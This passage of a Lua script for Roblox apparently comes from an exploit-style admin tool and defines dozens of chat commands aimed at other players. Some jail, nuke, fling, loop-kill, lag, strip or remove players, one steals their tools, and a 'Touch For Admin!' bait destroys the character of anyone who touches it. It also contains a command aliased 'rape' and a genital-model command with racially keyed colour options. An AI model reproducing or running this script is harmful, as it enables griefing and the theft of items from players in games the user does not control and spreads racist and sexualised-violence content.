			SKY['Skybox' .. v] = 'rbxassetid://' .. ARGS[1] - 1
		end
	end
end)

ADD_COMMAND('ambient','ambient [r] [g] [b]',{},
function(ARGS, SPEAKER)
	if ARGS[1] and ARGS[2] and ARGS[3] then
		_LIGHTING.Ambient = C3(ARGS[1], ARGS[2], ARGS[3])
	end
end)

ADD_COMMAND('jail','jail [plr]',{},
function(ARGS, SPEAKER)
	local PLAYERS = GET_PLAYER(ARGS[1], SPEAKER)
	for i,v in pairs(PLAYERS) do
		if FIND_IN_TABLE(JAILED, _PLAYERS[v].Name) then return end
		table.insert(JAILED, _PLAYERS[v].Name)
		local PCHAR = _PLAYERS[v].Character
		local J = JAIL:Clone() J.Parent = workspace J:MoveTo(PCHAR.Torso.Position) J.Name = 'JAIL_' .. _PLAYERS[v].Name
		repeat wait()
			PCHAR = _PLAYERS[v].Character if PCHAR and PCHAR:FindFirstChild('HumanoidRootPart') and J:FindFirstChild('MAIN') then PCHAR.HumanoidRootPart.CFrame = J.MAIN.CFrame + Vector3.new(0, 1, 0) end
		until not FIND_IN_TABLE(JAILED, _PLAYERS[v].Name)
	end
end)

ADD_COMMAND('unjail','unjail [plr]',{},
function(ARGS, SPEAKER)
	local PLAYERS = GET_PLAYER(ARGS[1], SPEAKER)
	for i,v in pairs(PLAYERS) do
		for a,b in pairs(JAILED) do if b == _PLAYERS[v].Name then table.remove(JAILED, a) end end
		if workspace:FindFirstChild('JAIL_' .. _PLAYERS[v].Name) then workspace['JAIL_' .. _PLAYERS[v].Name]:destroy() end
	end
end)

ADD_COMMAND('animation','animation [plr] [id]',{'anim'},
function(ARGS, SPEAKER)
	local PLAYERS = GET_PLAYER(ARGS[1], SPEAKER)
	for i,v in pairs(PLAYERS) do
		local ID = ARGS[2]
		if ARGS[2] == 'climb' then ID = '180436334' end
		if ARGS[2] == 'fall' then ID = '180436148' end
		if ARGS[2] == 'jump' then ID = '125750702' end
		if ARGS[2] == 'sit' then ID = '178130996' end
		for a,b in pairs(_PLAYERS[v].Character.Animate:GetChildren()) do
			if b:IsA('StringValue') then
				for c,d in pairs(b:GetChildren()) do
					if d:IsA('Animation') then
						d.AnimationId = 'rbxassetid://' .. ID
					end
				end
			end
		end
	end
end)

ADD_COMMAND('fix','fix [plr]',{},
function(ARGS, SPEAKER)
	local PLAYERS = GET_PLAYER(ARGS[1], SPEAKER)
	for i,v in pairs(PLAYERS) do
		local PCHAR = _PLAYERS[v].Character
		RESET_MODEL(PCHAR)
		UPDATE_MODEL(PCHAR, _PLAYERS[v].Name)
	end
end)

ADD_COMMAND('creeper','creeper [plr]',{'crpr'},
function(ARGS, SPEAKER)
	local PLAYERS = GET_PLAYER(ARGS[1], SPEAKER)
	for i,v in pairs(PLAYERS) do
		CREEPER(_PLAYERS[v])
	end
end)

ADD_COMMAND('uncreeper','uncreeper [plr]',{},
function(ARGS, SPEAKER)
	local PLAYERS = GET_PLAYER(ARGS[1], SPEAKER)
	for i,v in pairs(PLAYERS) do
		local PCHAR = _PLAYERS[v].Character
		RESET_MODEL(PCHAR)
		UPDATE_MODEL(PCHAR, _PLAYERS[v].Name)
	end
end)

ADD_COMMAND('shrek','shrek [plr]',{},
function(ARGS, SPEAKER)
	local PLAYERS = GET_PLAYER(ARGS[1], SPEAKER)
	for i,v in pairs(PLAYERS) do
		SHREK(_PLAYERS[v])
	end
end)

ADD_COMMAND('unshrek','unshrek [plr]',{},
function(ARGS, SPEAKER)
	local PLAYERS = GET_PLAYER(ARGS[1], SPEAKER)
	for i,v in pairs(PLAYERS) do
		local PCHAR = _PLAYERS[v].Character
		RESET_MODEL(PCHAR)
		UPDATE_MODEL(PCHAR, _PLAYERS[v].Name)
	end
end)

ADD_COMMAND('nuke','nuke [plr]',{},
function(ARGS, SPEAKER)
	local PLAYERS = GET_PLAYER(ARGS[1], SPEAKER)
	for i,v in pairs(PLAYERS) do
		local PCHAR = _PLAYERS[v].Character
		spawn(function()
			if _PLAYERS[v] and PCHAR and PCHAR:FindFirstChild('Torso')  then
				local N = Instance.new('Part', workspace)
				N.Name = 'nuke_seth'
				N.Anchored = true
				N.CanCollide = false
				N.Shape = 'Ball'
				N.Size = Vector3.new(1, 1, 1)
				N.BrickColor = BrickColor.new('New Yeller')
				N.Transparency = 0.5
				N.Reflectance = 0.2
				N.TopSurface = 0
				N.BottomSurface = 0
				N.Touched:connect(function(T)
					if T and T.Parent then
						local E = Instance.new('Explosion', workspace)
						E.Position = T.Position
						E.BlastRadius = 20
						E.BlastPressure = math.huge
					end
				end)
				local CF = PCHAR.Torso.CFrame
				N.CFrame = CF
				for i = 1,30 do
					N.Size = N.Size + Vector3.new(5, 5, 5)
					N.CFrame = CF
					wait(1 / 44)
				end
				N:destroy()
			end
		end)
	end
end)

ADD_COMMAND('unnuke','nonuke',{},
function(ARGS, SPEAKER)
	for i,v in pairs(workspace:GetChildren()) do
		if v:IsA('Part') and v.Name == 'nuke_seth' then
			v:destroy()
		end
	end
end)

ADD_COMMAND('infect','infect [plr]',{},
function(ARGS, SPEAKER)
	local PLAYERS = GET_PLAYER(ARGS[1], SPEAKER)
	for i,v in pairs(PLAYERS) do
		INFECT(_PLAYERS[v])
	end
end)

ADD_COMMAND('uninfect','uninfect [plr]',{},
function(ARGS, SPEAKER)
	local PLAYERS = GET_PLAYER(ARGS[1], SPEAKER)
	for i,v in pairs(PLAYERS) do
		local PCHAR = _PLAYERS[v].Character
		RESET_MODEL(PCHAR)
		UPDATE_MODEL(PCHAR, _PLAYERS[v].Name)
	end
end)

ADD_COMMAND('duck','duck [plr]',{},
function(ARGS, SPEAKER)
	local PLAYERS = GET_PLAYER(ARGS[1], SPEAKER)
	for i,v in pairs(PLAYERS) do
		DUCK(_PLAYERS[v])
	end
end)

ADD_COMMAND('unduck','unduck [plr]',{},
function(ARGS, SPEAKER)
	local PLAYERS = GET_PLAYER(ARGS[1], SPEAKER)
	for i,v in pairs(PLAYERS) do
		local PCHAR = _PLAYERS[v].Character
		RESET_MODEL(PCHAR)
		UPDATE_MODEL(PCHAR, _PLAYERS[v].Name)
	end
end)

ADD_COMMAND('disable','disable [plr]',{},
function(ARGS, SPEAKER)
	local PLAYERS = GET_PLAYER(ARGS[1], SPEAKER)
	for i,v in pairs(PLAYERS) do
		local PCHAR = _PLAYERS[v].Character
		if PCHAR:FindFirstChild('Humanoid') then
			PCHAR.Humanoid.Name = 'HUMANOID_' .. _PLAYERS[v].Name
			local humanoid = PCHAR['HUMANOID_' .. _PLAYERS[v].Name]
			humanoid.Parent = HUMANOIDS
		end
	end
end)

ADD_COMMAND('enable','enable [plr]',{},
function(ARGS, SPEAKER)
	local PLAYERS = GET_PLAYER(ARGS[1], SPEAKER)
	for i,v in pairs(PLAYERS) do
		local PCHAR = _PLAYERS[v].Character
		if PCHAR:FindFirstChild('Humanoid') then
			return
		else
			if HUMANOIDS:FindFirstChild('HUMANOID_' .. _PLAYERS[v].Name) then
				local humanoid = HUMANOIDS['HUMANOID_' .. _PLAYERS[v].Name] humanoid.Parent = PCHAR humanoid.Name = 'Humanoid'
			end
		end
	end
end)

ADD_COMMAND('size','size [plr] [int]',{},
function(ARGS, SPEAKER)
	local PLAYERS = GET_PLAYER(ARGS[1], SPEAKER)
	for i,v in pairs(PLAYERS) do
		SCALE(_PLAYERS[v].Character, ARGS[2])
	end
end)

ADD_COMMAND('clone','clone [plr]',{},
function(ARGS, SPEAKER)
	local PLAYERS = GET_PLAYER(ARGS[1], SPEAKER)
	for i,v in pairs(PLAYERS) do
		local PCHAR = _PLAYERS[v].Character PCHAR.Archivable = true
		local C = PCHAR:Clone() C.Parent = workspace C:MoveTo(PCHAR:GetModelCFrame().p) C:MakeJoints()
		PCHAR.Archivable = false
	end
end)

ADD_COMMAND('spin','spin [plr]',{},
function(ARGS, SPEAKER)
	local PLAYERS = GET_PLAYER(ARGS[1], SPEAKER)
	for i,v in pairs(PLAYERS) do
		local PCHAR = _PLAYERS[v].Character
		for i,v in pairs(PCHAR.Torso:GetChildren()) do
			if v.Name == 'SPIN' then
				v:destroy()
			end
		end
		local T = PCHAR.Torso
		local BG = Instance.new('BodyGyro', T) BG.Name = 'SPIN' BG.maxTorque = Vector3.new(0, math.huge, 0) BG.P = 11111 BG.cframe = T.CFrame
		spawn(function()
			repeat wait(1/44)
				BG.CFrame = BG.CFrame * CFrame.Angles(0,math.rad(30),0)
			until not BG or BG.Parent ~= T
		end)
	end
end)

ADD_COMMAND('unspin','unspin [plr]',{},
function(ARGS, SPEAKER)
	local PLAYERS = GET_PLAYER(ARGS[1], SPEAKER)
	for i,v in pairs(PLAYERS) do
		local PCHAR = _PLAYERS[v].Character
		for i,v in pairs(PCHAR.Torso:GetChildren()) do
			if v.Name == 'SPIN' then
				v:destroy()
			end
		end
	end
end)

ADD_COMMAND('dog','dog [plr]',{},
function(ARGS, SPEAKER)
	local PLAYERS = GET_PLAYER(ARGS[1], SPEAKER)
	for i,v in pairs(PLAYERS) do
		DOG(_PLAYERS[v])
	end
end)

ADD_COMMAND('undog','undog [plr]',{},
function(ARGS, SPEAKER)
	local PLAYERS = GET_PLAYER(ARGS[1], SPEAKER)
	for i,v in pairs(PLAYERS) do
		local PCHAR = _PLAYERS[v].Character
		RESET_MODEL(PCHAR)
		UPDATE_MODEL(PCHAR, _PLAYERS[v].Name)
	end
end)

ADD_COMMAND('loopheal','loopheal [plr]',{'lheal'},
function(ARGS, SPEAKER)
	local PLAYERS = GET_PLAYER(ARGS[1], SPEAKER)
	for i,v in pairs(PLAYERS) do
		if not FIND_IN_TABLE(LOOPED_H, _PLAYERS[v].Name) then
			table.insert(LOOPED_H, _PLAYERS[v].Name)
		end
	end
end)

ADD_COMMAND('unloopheal','unloopheal [plr]',{'unlheal'},
function(ARGS, SPEAKER)
	local PLAYERS = GET_PLAYER(ARGS[1], SPEAKER)
	for i,v in pairs(PLAYERS) do
		if FIND_IN_TABLE(LOOPED_H, _PLAYERS[v].Name) then
			table.remove(LOOPED_H, GET_IN_TABLE(LOOPED_H, _PLAYERS[v].Name))
		end
	end
end)

ADD_COMMAND('loopkill','loopheal [plr]',{'lheal'},
function(ARGS, SPEAKER)
	local PLAYERS = GET_PLAYER(ARGS[1], SPEAKER)
	for i,v in pairs(PLAYERS) do
		if not FIND_IN_TABLE(LOOPED_K, _PLAYERS[v].Name) then
			table.insert(LOOPED_K, _PLAYERS[v].Name)
		end
	end
end)

ADD_COMMAND('unloopkill','unloopkill [plr]',{'unlkill'},
function(ARGS, SPEAKER)
	local PLAYERS = GET_PLAYER(ARGS[1], SPEAKER)
	for i,v in pairs(PLAYERS) do
		if FIND_IN_TABLE(LOOPED_K, _PLAYERS[v].Name) then
			table.remove(LOOPED_K, GET_IN_TABLE(LOOPED_K, _PLAYERS[v].Name))
		end
	end
end)

ADD_COMMAND('fling','fling [plr]',{},
function(ARGS, SPEAKER)
	local PLAYERS = GET_PLAYER(ARGS[1], SPEAKER)
	for i,v in pairs(PLAYERS) do
		local PCHAR = _PLAYERS[v].Character
		if PCHAR:FindFirstChild('Humanoid') then
			local X
			local Z
			repeat
				X = math.random(-9999, 9999)
			until math.abs(X) >= 5555
			repeat
				Z = math.random(-9999, 9999)
			until math.abs(Z) >= 5555
			PCHAR.Torso.Velocity = Vector3.new(0, 0, 0)
			local BF = Instance.new('BodyForce', PCHAR.Torso) BF.force = Vector3.new(X * 4, 9999 * 5, Z * 4)
		end
	end
end)

ADD_COMMAND('alien','alien [plr]',{},
function(ARGS, SPEAKER)
	local PLAYERS = GET_PLAYER(ARGS[1], SPEAKER)
	for i,v in pairs(PLAYERS) do
		ALIEN(_PLAYERS[v])
	end
end)

ADD_COMMAND('nograv','nograv [plr]',{},
function(ARGS, SPEAKER)
	local PLAYERS = GET_PLAYER(ARGS[1], SPEAKER)
	for i,v in pairs(PLAYERS) do
		if not _PLAYERS[v].Character.Torso:FindFirstChild('nograv_seth') then
			NEW'BodyForce'{Name = 'nograv_seth', Force = Vector3.new(0, GET_MASS(_PLAYERS[v].Character) * 196.2, 0), Parent = _PLAYERS[v].Character.Torso}
		end
	end
end)

ADD_COMMAND('grav','grav [plr]',{},
function(ARGS, SPEAKER)
	local PLAYERS = GET_PLAYER(ARGS[1], SPEAKER)
	for i,v in pairs(PLAYERS) do
		if _PLAYERS[v].Character.Torso:FindFirstChild('nograv_seth') then
			_PLAYERS[v].Character.Torso.nograv_seth:destroy()
		end
	end
end)

ADD_COMMAND('cape','cape [brick color]',{},
function(ARGS, SPEAKER)
	spawn(function()
		if LP.Character:FindFirstChild('Cape') then
			LP.Character.Cape:destroy()
		end
		if not ARGS[1] then
			ARGS[1] = 'Deep blue'
		end
		CAPE(GLS(false, 1))
	end)
end)

ADD_COMMAND('uncape','uncape',{},
function(ARGS, SPEAKER)
	if LP.Character:FindFirstChild('cape_seth') then
		LP.Character.cape_seth:destroy()
	end
end)

ADD_COMMAND('paper','paper [plr]',{},
function(ARGS, SPEAKER)
	local PLAYERS = GET_PLAYER(ARGS[1], SPEAKER)
	for i,v in pairs(PLAYERS) do
		local PCHAR = _PLAYERS[v].Character
		for i,v in pairs(PCHAR:GetChildren()) do
			if v:IsA('Part') and v.Name ~= 'HumanoidRootPart' then
				PAPER_MESH:Clone().Parent = v
			end
		end
	end
end)

ADD_COMMAND('punish','punish [plr]',{},
function(ARGS, SPEAKER)
	local PLAYERS = GET_PLAYER(ARGS[1], SPEAKER)
	for i,v in pairs(PLAYERS) do
		_PLAYERS[v].Character.Parent = nil
	end
end)

ADD_COMMAND('unpunish','unpunish [plr]',{},
function(ARGS, SPEAKER)
	local PLAYERS = GET_PLAYER(ARGS[1], SPEAKER)
	for i,v in pairs(PLAYERS) do
		_PLAYERS[v].Character.Parent = workspace
	end
end)

local DISCO = false

ADD_COMMAND('disco','disco',{},
function(ARGS, SPEAKER)
	DISCO = true
	if not DISCO then
		spawn(function()
			repeat wait(1) _LIGHTING.Ambient = C3(math.random(), math.random(), math.random()) until not DISCO
		end)
	end
end)

ADD_COMMAND('undisco','undisco',{},
function(ARGS, SPEAKER)
	DISCO = false
end)

ADD_COMMAND('team','team [plr] [team]',{},
function(ARGS, SPEAKER)
	local PLAYERS = GET_PLAYER(ARGS[1], SPEAKER)
	for i,v in pairs(PLAYERS) do
		for a,b in pairs(game.Teams:GetChildren()) do
			if string.lower(b.Name) == GLS(true, 1) then
				_PLAYERS[v].Team = b
			end
		end
	end
end)

ADD_COMMAND('jp','jp [plr] [int]',{},
function(ARGS, SPEAKER)
	local PLAYERS = GET_PLAYER(ARGS[1], SPEAKER)
	for i,v in pairs(PLAYERS) do
		local PCHAR = _PLAYERS[v].Character
		if PCHAR:FindFirstChild('Humanoid') then PCHAR.Humanoid.JumpPower = ARGS[2] end
	end
end)

ADD_COMMAND('smallhead','smallhead [plr]',{'shead'},
function(ARGS, SPEAKER)
	local PLAYERS = GET_PLAYER(ARGS[1], SPEAKER)
	for i,v in pairs(PLAYERS) do
		local PCHAR = _PLAYERS[v].Character
		PCHAR.Head.Mesh.Scale = Vector3.new(0.5, 0.5, 0.5)
		PCHAR.Head.Mesh.Offset = Vector3.new(0, -0.25, 0)
	end
end)

ADD_COMMAND('bighead','bighead [plr]',{'bhead'},
function(ARGS, SPEAKER)
	local PLAYERS = GET_PLAYER(ARGS[1], SPEAKER)
	for i,v in pairs(PLAYERS) do
		local PCHAR = _PLAYERS[v].Character
		PCHAR.Head.Mesh.Scale = Vector3.new(2.25, 2.25, 2.25)
		PCHAR.Head.Mesh.Offset = Vector3.new(0, 0.5, 0)
	end
end)

ADD_COMMAND('headsize','headsize [plr] [int]',{'hsize'},
function(ARGS, SPEAKER)
	local PLAYERS = GET_PLAYER(ARGS[1], SPEAKER)
	for i,v in pairs(PLAYERS) do
		local PCHAR = _PLAYERS[v].Character
		if ARGS[2] == 1 then
			PCHAR.Head.Mesh.Scale = Vector3.new(1.25, 1.25, 1.25)
			PCHAR.Head.Mesh.Offset = Vector3.new(0, 0, 0)
		else
			PCHAR.Head.Mesh.Scale = ARGS[2] * Vector3.new(1.25, 1.25, 1.25)
		end
	end
end)

ADD_COMMAND('fixhead','fixhead [plr]',{'fhead'},
function(ARGS, SPEAKER)
	local PLAYERS = GET_PLAYER(ARGS[1], SPEAKER)
	for i,v in pairs(PLAYERS) do
		local PCHAR = _PLAYERS[v].Character
		PCHAR.Head.Mesh.Scale = Vector3.new(1.25, 1.25, 1.25)
		PCHAR.Head.Mesh.Offset = Vector3.new(0, 0, 0)
		PCHAR.Head.Transparency = 0
		if PCHAR.Head:FindFirstChild('face') then PCHAR.Head.face.Transparency = 0 end
	end
end)

ADD_COMMAND('removehead','removehead [plr]',{'rhead'},
function(ARGS, SPEAKER)
	local PLAYERS = GET_PLAYER(ARGS[1], SPEAKER)
	for i,v in pairs(PLAYERS) do
		local PCHAR = _PLAYERS[v].Character
		PCHAR.Head.Transparency = 1
		if PCHAR.Head:FindFirstChild('face') then PCHAR.Head.face.Transparency = 1 end
	end
end)

ADD_COMMAND('stealtools','stealtools [plr]',{'stools'},
function(ARGS, SPEAKER)
	local PLAYERS = GET_PLAYER(ARGS[1], SPEAKER)
	for i,v in pairs(PLAYERS) do
		for i,v in pairs(_PLAYERS[v].Backpack:GetChildren()) do
			if v:IsA('Tool') or v:IsA('HopperBin') then
				v.Parent = LP.Backpack
			end
		end
	end
end)

ADD_COMMAND('removetools','removetools [plr]',{'rtools'},
function(ARGS, SPEAKER)
	local PLAYERS = GET_PLAYER(ARGS[1], SPEAKER)
	for i,v in pairs(PLAYERS) do
		for i,v in pairs(_PLAYERS[v].Backpack:GetChildren()) do
			if v:IsA('Tool') or v:IsA('HopperBin') then
				v:destroy()
			end
		end
	end
end)

ADD_COMMAND('clonetools','clonetools [plr]',{'ctools'},
function(ARGS, SPEAKER)
	local PLAYERS = GET_PLAYER(ARGS[1], SPEAKER)
	for i,v in pairs(PLAYERS) do
		for i,v in pairs(_PLAYERS[v].Backpack:GetChildren()) do
			if v:IsA('Tool') or v:IsA('HopperBin') then
				v:Clone().Parent = LP.Backpack
			end
		end
	end
end)

ADD_COMMAND('dong','dong [plr]',{},
function(ARGS, SPEAKER)
	local PLAYERS = GET_PLAYER(ARGS[1], SPEAKER)
	for i,v in pairs(PLAYERS) do
		local PCHAR = _PLAYERS[v].Character
		if ARGS[2] == 'black' then
			CREATE_DONG(_PLAYERS[v], 'Brown')
		end
		if ARGS[2] == 'asian' then
			CREATE_DONG(_PLAYERS[v], 'Cool yellow')
		end
		if ARGS[2] == 'alien' then
			CREATE_DONG(_PLAYERS[v], 'Lime green')
		end
		if ARGS[2] == 'frozen' then
			CREATE_DONG(_PLAYERS[v], 1019)
		end
		if not ARGS[2] then
			CREATE_DONG(_PLAYERS[v], 'Pastel brown')
		end
	end
end)

ADD_COMMAND('particles','particles [plr] [id]',{'pts'},
function(ARGS, SPEAKER)
	local PLAYERS = GET_PLAYER(ARGS[1], SPEAKER)
	for i,v in pairs(PLAYERS) do
		local PCHAR = _PLAYERS[v].Character
		for i,v in pairs(PCHAR.Torso:GetChildren()) do
			if v:IsA('ParticleEmitter') then
				v:destroy()
			end
		end
		Instance.new('ParticleEmitter', PCHAR.Torso).Texture = 'rbxassetid://' .. ARGS[2] - 1
	end
end)

ADD_COMMAND('rocket','rocket [plr]',{},
function(ARGS, SPEAKER)
	local PLAYERS = GET_PLAYER(ARGS[1], SPEAKER)
	for i,v in pairs(PLAYERS) do
		local PCHAR = _PLAYERS[v].Character
		spawn(function()
			local R = ROCKET:Clone()
			R.Parent = workspace
			local W = Instance.new('Weld', R)
			W.Part0 = W.Parent
			W.Part1 = PCHAR.Torso
			W.C1 = CFrame.new(0, 0.5, 1)
			R.force.Force = Vector3.new(0, 15000, 0)
			wait()
			PCHAR.HumanoidRootPart.CFrame = PCHAR.HumanoidRootPart.CFrame * CFrame.new(0, 5, 0)
			wait(5)
			Instance.new('Explosion', R).Position = R.Position
			wait(1)
			R:destroy()
		end)
	end
end)

ADD_COMMAND('blackify','blackify [plr]',{},
function(ARGS, SPEAKER)
	local PLAYERS = GET_PLAYER(ARGS[1], SPEAKER)
	for i,v in pairs(PLAYERS) do
		COLOR(_PLAYERS[v], 'Really black')
	end
end)

ADD_COMMAND('whitify','whitify [plr]',{},
function(ARGS, SPEAKER)
	local PLAYERS = GET_PLAYER(ARGS[1], SPEAKER)
	for i,v in pairs(PLAYERS) do
		COLOR(_PLAYERS[v], 'White')
	end
end)

ADD_COMMAND('color','color [plr] [brick color]',{},
function(ARGS, SPEAKER)
	local PLAYERS = GET_PLAYER(ARGS[1], SPEAKER)
	for i,v in pairs(PLAYERS) do
		COLOR(_PLAYERS[v], GLS(false, 1))
	end
end)

ADD_COMMAND('change','change [plr] [stat] [int/string]',{},
function(ARGS, SPEAKER)
	local PLAYERS = GET_PLAYER(ARGS[1], SPEAKER)
	for i,v in pairs(PLAYERS) do
		if _PLAYERS[v]:FindFirstChild('leaderstats') then
			for i,v in pairs(_PLAYERS[v].leaderstats:GetChildren()) do
				if string.lower(v.Name) == string.lower(ARGS[2]) and v:IsA('IntValue') or v:IsA('NumberValue') then
					if ARGS[3] then v.Value = tonumber(ARGS[3]) end
				elseif string.lower(v.Name) == string.lower(ARGS[2]) and v:IsA('StringValue') then
					v.Value = GLS(false, 2)
				end
			end
		end
	end
end)

ADD_COMMAND('bait','bait',{},
function(ARGS, SPEAKER)
	spawn(function()
		local M = Instance.new('Model', workspace) M.Name = 'Touch For Admin!'
		local P = Instance.new('Part', M) P.Name = 'Head' P.Position = SPEAKER.Character.Head.Position P.BrickColor = BrickColor.new('Pink') P.Material = 'Neon'
		local H = Instance.new('Humanoid', M)
		P.Touched:connect(function(RIP) if RIP.Parent.Name ~= SPEAKER.Name or RIP.Parent.Name ~= LP.Name then if RIP.Parent:FindFirstChild('Humanoid') then RIP.Parent.Humanoid:destroy() end end end)
	end)
end)

ADD_COMMAND('naked','naked [plr]',{},
function(ARGS, SPEAKER)
	local PLAYERS = GET_PLAYER(ARGS[1], SPEAKER)
	for i,v in pairs(PLAYERS) do
		local PCHAR = _PLAYERS[v].Character
		for i,v in pairs(PCHAR:GetChildren()) do
			if v:IsA('Accessory') or v:IsA('Shirt') or v:IsA('Pants') or v:IsA('ShirtGraphic') then
				v:destroy()
			end
			for i,v in pairs(PCHAR.Torso:GetChildren()) do
				if v:IsA('Decal') then
					v:destroy()
				end
			end
		end
	end
end)

ADD_COMMAND('decalspam','decalspam [decal]',{'dspam'},
function(ARGS, SPEAKER)
	if ARGS[1] then
		DECALSPAM(workspace, ARGS[1])
	end
end)

ADD_COMMAND('undecalspam','undecalspam',{'undspam'},
function(ARGS, SPEAKER)
	if ARGS[1] then
		UNDECALSPAM(workspace)
	end
end)

ADD_COMMAND('bang','bang [plr]',{'rape'},
function(ARGS, SPEAKER)
	local PLAYERS = GET_PLAYER(ARGS[1], SPEAKER)
	for i,v in pairs(PLAYERS) do
		BANG(_PLAYERS[v].Name)
	end
end)

ADD_COMMAND('lag','lag [plr]',{},
function(ARGS, SPEAKER)
	local PLAYERS = GET_PLAYER(ARGS[1], SPEAKER)
	for i,v in pairs(PLAYERS) do
		LAG(_PLAYERS[v])
	end
end)

ADD_COMMAND('respawn','respawn [plr]',{},
function(ARGS, SPEAKER)
	local PLAYERS = GET_PLAYER(ARGS[1], SPEAKER)
	for i,v in pairs(PLAYERS) do
		RESPAWN(_PLAYERS[v])
	end
end)

ADD_COMMAND('face','face [plr] [decal]',{},
function(ARGS, SPEAKER)
	local PLAYERS = GET_PLAYER(ARGS[1], SPEAKER)
	for i,v in pairs(PLAYERS) do
		local PCHAR = _PLAYERS[v].Character
		for i,v in pairs(PCHAR.Head:GetChildren()) do if v:IsA('Decal') then v:destroy() end end
		local F = Instance.new('Decal', PCHAR.Head) F.Name = 'face' F.Texture = 'rbxassetid://' .. ARGS[2] - 1
	end
end)

ADD_COMMAND('shirt','shirt [plr] [decal]',{},
function(ARGS, SPEAKER)
	local PLAYERS = GET_PLAYER(ARGS[1], SPEAKER)
	for i,v in pairs(PLAYERS) do
		local PCHAR = _PLAYERS[v].Character
		for i,v in pairs(PCHAR:GetChildren()) do if v:IsA('Shirt') then v:destroy() end end
		local S = Instance.new('Shirt', PCHAR) S.Name = 'Shirt' S.ShirtTemplate = 'rbxassetid://' .. ARGS[2] - 1
	end
end)

ADD_COMMAND('pants','pants [plr] [decal]',{},
function(ARGS, SPEAKER)
	local PLAYERS = GET_PLAYER(ARGS[1], SPEAKER)
	for i,v in pairs(PLAYERS) do
		local PCHAR = _PLAYERS[v].Character
		for i,v in pairs(PCHAR:GetChildren()) do if v:IsA('Pants') then v:destroy() end end
		local P = Instance.new('Pants', PCHAR) P.Name = 'Shirt' P.PantsTemplate = 'rbxassetid://' .. ARGS[2] - 1
	end
end)

ADD_COMMAND('longneck','longneck [plr]',{'lneck', 'giraffe'},
function(ARGS, SPEAKER)
	local PLAYERS = GET_PLAYER(ARGS[1], SPEAKER)
	for i,v in pairs(PLAYERS) do
		local PCHAR = _PLAYERS[v].Character
		RESET_MODEL(PCHAR)
		UPDATE_MODEL(PCHAR, _PLAYERS[v].Name)
		for i,v in pairs(PCHAR:GetChildren()) do if v:IsA('Accessory') then v.Handle.Mesh.Offset = Vector3.new(0, 5, 0) end end
		if PCHAR.Head:FindFirstChild('Mesh') then PCHAR.Head.Mesh.Offset = Vector3.new(0, 5, 0) end
		local G = Instance.new('Part', PCHAR) G.Name = 'giraffe_seth' G.BrickColor = PCHAR.Head.BrickColor G.Size = Vector3.new(2, 1, 1)
		local SM = Instance.new('SpecialMesh', G) SM.Scale = Vector3.new(1.25, 5, 1.25) SM.Offset = Vector3.new(0, 2, 0)
		local W = Instance.new('Weld', G) W.Part0 = PCHAR.Head W.Part1 = G
	end
end)

ADD_COMMAND('stealchar','stealchar [plr]',{'schar'},
function(ARGS, SPEAKER)
	local PLAYERS1, PLAYERS2 = GET_PLAYER(ARGS[1])
	for i,v in pairs(PLAYERS1) do
		RESET_MODEL(SPEAKER.Character) UPDATE_MODEL(SPEAKER.Character, _PLAYERS[v].Name)
	end
end)

ADD_COMMAND('baseplate','baseplate',{'bp'},
function(ARGS, SPEAKER)
	for i,v in pairs(workspace:GetChildren()) do if v:IsA('Model') and v.Name == 'baseplate_seth' then v:destroy() end end
	local BP = Instance.new('Part', workspace) BP.Name = 'baseplate_seth' BP.Anchored = true BP.BrickColor = BrickColor.new('Bright green') BP.Size = Vector3.new(2048, 5, 2048) BP.Position = Vector3.new(0, 0, 0)
end)

ADD_COMMAND('norotate','norotate [plr]',{'nrt'},
function(ARGS, SPEAKER)
	local PLAYERS = GET_PLAYER(ARGS[1], SPEAKER)
	for i,v in pairs(PLAYERS) do
		local PCHAR = _PLAYERS[v].Character
		if PCHAR:FindFirstChild('Humanoid') then PCHAR.Humanoid.AutoRotate = false end
	end
end)

ADD_COMMAND('rotate','rotate [plr]',{'rt'},
function(ARGS, SPEAKER)
	local PLAYERS = GET_PLAYER(ARGS[1], SPEAKER)
	for i,v in pairs(PLAYERS) do
		local PCHAR = _PLAYERS[v].Character
		if PCHAR:FindFirstChild('Humanoid') then PCHAR.Humanoid.AutoRotate = true end
	end
end)

ADD_COMMAND('admin','admin [plr]',{},
function(ARGS, SPEAKER)
	local PLAYERS = GET_PLAYER(ARGS[1], SPEAKER)
	for i,v in pairs(PLAYERS) do
		if not CHECK_ADMIN(_PLAYERS[v]) then
			table.insert(ADMINS, _PLAYERS[v].userId)
			UPDATE_ADMINS()
			spawn(function()
				game.Chat:Chat(_PLAYERS[v].Character.Head, STUFF .. 'You\'re now an admin!')
				wait(3)
				game.Chat:Chat(_PLAYERS[v].Character.Head, STUFF .. 'Give me a try! | ' .. C_PREFIX .. 'ff me')
			end)
		end
	end
end)

ADD_COMMAND('unadmin','unadmin [plr]',{},
function(ARGS, SPEAKER)
	local PLAYERS = GET_PLAYER(ARGS[1], SPEAKER)
	for i,v in pairs(PLAYERS) do
		if CHECK_ADMIN(_PLAYERS[v]) then
			if FIND_IN_TABLE(ADMINS, _PLAYERS[v].userId) then
				table.remove(ADMINS, GET_IN_TABLE(ADMINS, _PLAYERS[v].userId))
				UPDATE_ADMINS()
				game.Chat:Chat(_PLAYERS[v].Character.Head, STUFF .. 'You\'re no longer an admin.')
			end
		end
	end
end)

ADD_COMMAND('minzoom','minzoom [plr] [int]',{'minz'},
function(ARGS, SPEAKER)
	local PLAYERS = GET_PLAYER(ARGS[1], SPEAKER)
	for i,v in pairs(PLAYERS) do
		_PLAYERS[v].CameraMinZoomDistance = ARGS[2]
	end
end)

ADD_COMMAND('maxzoom','maxzoom [plr] [int]',{'maxz'},
function(ARGS, SPEAKER)
	local PLAYERS = GET_PLAYER(ARGS[1], SPEAKER)
	for i,v in pairs(PLAYERS) do
		_PLAYERS[v].CameraMaxZoomDistance = ARGS[2]
	end
end)

ADD_COMMAND('age','age [plr]',{},
function(ARGS, SPEAKER)
	local PLAYERS = GET_PLAYER(ARGS[1], SPEAKER)
	for i,v in pairs(PLAYERS) do
		NOTIFY(_PLAYERS[v].Name .. ' | ' .. _PLAYERS[v].AccountAge, 255, 255, 255)
	end
end)

ADD_COMMAND('hl','hl [plr] [r] [g] [b]',{},
function(ARGS, SPEAKER)
	local PLAYERS = GET_PLAYER(ARGS[1], SPEAKER)
	for i,v in pairs(PLAYERS) do
		local PCHAR = _PLAYERS[v].Character
		if PCHAR:FindFirstChild('Torso') then
			local HL = Instance.new('SpotLight', PCHAR.Torso) HL.Name = 'seth_hl' HL.Brightness = 5 HL.Range = 60
			if ARGS[2] and ARGS[3] and ARGS[4] then
				HL.Color = C3(ARGS[2], ARGS[3], ARGS[4])
			end
